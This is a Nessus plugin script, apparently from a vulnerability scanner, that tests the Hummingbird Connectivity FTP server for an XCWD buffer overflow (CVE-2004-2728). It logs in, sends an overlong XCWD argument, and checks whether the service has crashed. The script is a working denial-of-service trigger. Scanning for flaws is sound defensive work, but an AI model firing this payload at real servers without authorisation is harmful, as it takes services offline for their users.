#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from Tenable Network Security
#
#  Ref:  CESG Network Defence Team  - http://www.cesg.gov.uk/
#
#  This script is released under the GNU GPL v2
#

# Changes by Tenable:
# - Revised plugin title, changed family (6/16/09)


include("compat.inc");

if(description)
{
 script_id(15613);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2004-2728");
 script_bugtraq_id(11542);
 script_xref(name:"OSVDB", value:11133);
 script_xref(name:"Secunia", value:12984);
 script_name(english:"Hummingbird Connectivity FTP Service XCWD Command Overflow");

 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the Hummingbird Connectivity FTP server.

It was possible to shut down the remote FTP server by issuing a XCWD
command followed by a too long argument.

This problem allows an attacker to prevent the remote site
from sharing some resources with the rest of the world." );
 script_set_attribute(attribute:"see_also", value:"http://connectivity.hummingbird.com/" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:S/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english:"Attempts a XCWD buffer overflow");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
 script_family(english:"FTP");
 script_dependencie("find_service1.nasl", "ftp_anonymous.nasl",
 		    "ftpserver_detect_type_nd_version.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 
 exit(0);
}

#
# The script code starts here
#

include("ftp_func.inc");
port = get_kb_item("Services/ftp");
if(!port)port = 21;

if (get_kb_item('ftp/'+port+'/backdoor') ||
    get_kb_item('ftp/'+port+'/broken')) exit(0);
if (! get_port_state(port)) exit(0);

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

soc = open_sock_tcp(port);
if (!soc) exit(0);

if(! ftp_authenticate(socket:soc, user:login, pass:password))
{
  close(soc);
  exit(0);
}

s = string("XCWD ", crap(256), "\r\n");
send(socket:soc, data:s);
r = recv_line(socket:soc, length:1024);
close(soc);

for (i = 0; i < 3; i ++)
{       
 soc = open_sock_tcp(port);
 if(soc)
 {
   close(soc);
   exit(0);
 }
 sleep(1);
}

security_note(port);
